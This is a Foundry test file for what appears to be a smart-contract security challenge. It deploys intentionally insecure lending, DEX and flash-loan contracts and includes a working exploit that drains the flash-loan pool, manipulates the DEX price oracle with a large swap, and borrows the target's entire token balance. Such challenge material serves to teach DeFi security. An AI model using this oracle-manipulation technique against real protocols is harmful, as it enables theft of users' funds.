// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./BorrowSystemInsecureOracle.sol";
import "../tokens/tokenBoring.sol";
import "../InsecureDexLP/InsecureDexLP.sol";
import "../InSecureumLenderPool/InSecureumLenderPoolExploit.sol";

contract BorrowSystemInsecureOracleExploitTest is Test {
    address playerAddress = makeAddr("player");

    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    function setUp() public {
        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));

        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(address(oracleDex), address(token0), address(token1));

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);
    }

    function test() public {
        vm.startPrank(playerAddress, playerAddress);

        BorrowSystemInsecureOracleExploit exploit =
            new BorrowSystemInsecureOracleExploit(address(oracleDex), address(flashLoanPool), address(target));
        exploit.exploit();

        vm.stopPrank();
        assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");
    }
}

contract BorrowSystemInsecureOracleExploit {
    InsecureDexLP immutable oracleDex;
    InSecureumLenderPool immutable flashLoanPool;
    BorrowSystemInsecureOracle immutable target;
    IERC20 immutable token0;
    IERC20 immutable token1;

    constructor(address oracleDexAddress, address flashLoanPoolAddress, address targetAddress) {
        oracleDex = InsecureDexLP(oracleDexAddress);
        flashLoanPool = InSecureumLenderPool(flashLoanPoolAddress);
        target = BorrowSystemInsecureOracle(targetAddress);
        token0 = oracleDex.token0();
        token1 = oracleDex.token1();
    }

    function exploit() external {
        // Exploit for the flash loan pool
        // It can be also solved by doing a flash loan normally.
        InSecureumLenderPoolExploit flashLoanPoolExploit = new InSecureumLenderPoolExploit(10000 ether);
        flashLoanPool.flashLoan(address(flashLoanPoolExploit), "");
        flashLoanPool.withdraw(10000 ether);

        // Price manipulation
        token0.approve(address(oracleDex), type(uint256).max);
        oracleDex.swap(address(token0), address(token1), 10000 ether);

        token1.approve(address(target), type(uint256).max);
        target.depositToken1(token1.balanceOf(address(this)));
        target.borrowToken0(token0.balanceOf(address(target)));
    }
}
